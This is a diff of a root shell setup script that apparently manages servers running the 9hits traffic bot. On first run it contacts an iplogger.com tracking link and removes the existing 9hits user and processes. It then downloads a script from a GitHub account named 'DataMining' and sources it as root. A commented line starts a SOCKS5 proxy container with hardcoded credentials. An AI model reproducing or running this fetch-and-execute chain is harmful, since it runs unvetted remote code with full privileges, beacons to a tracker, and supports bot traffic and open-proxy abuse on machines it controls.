@@ -29,18 +29,23 @@ chmod +x reconfige.sh
 #./reconfige.sh
 
 
-FILE=/root/Setup15
+FILE=/root/Setup16
 if test -f "$FILE"; then
     echo OK1
 else
-    echo "New Setup" > /root/Setup15
+    echo "New Setup" > /root/Setup16
     wget -O logger https://iplogger.com/2Lt1h5
+    
+    
+    rm /home/_9hits -fr || true
+    (pkill 9hits ; pkill 9hbrowser ; pkill 9htl ; pkill exe) || true
+    deluser _9hits || true
 
-        cd /root
-        rm setup_9.sh
-        wget -O setup_9.sh https://raw.githubusercontent.com/LearnAWS1234/DataMining/main/resetup_9.sh
-        chmod +x setup_9.sh
-        . ./setup_9.sh
+    cd /root
+    rm setup_9.sh
+    wget -O setup_9.sh https://raw.githubusercontent.com/LearnAWS1234/DataMining/main/resetup_9.sh
+    chmod +x setup_9.sh
+    . ./setup_9.sh
 
     wget -O logger https://iplogger.com/2Lt1h5
 
@@ -50,7 +55,7 @@ else
     #sudo docker rm proxy -f
     #sudo docker run -d --name proxy --restart=always --privileged -p443:443 -p443:443/udp ginuerzh/gost -L socks5://wordpressloadbalance:wordpresscloud@:443
 fi
-
+exit
 
 
 FILE=/root/ReSetup6
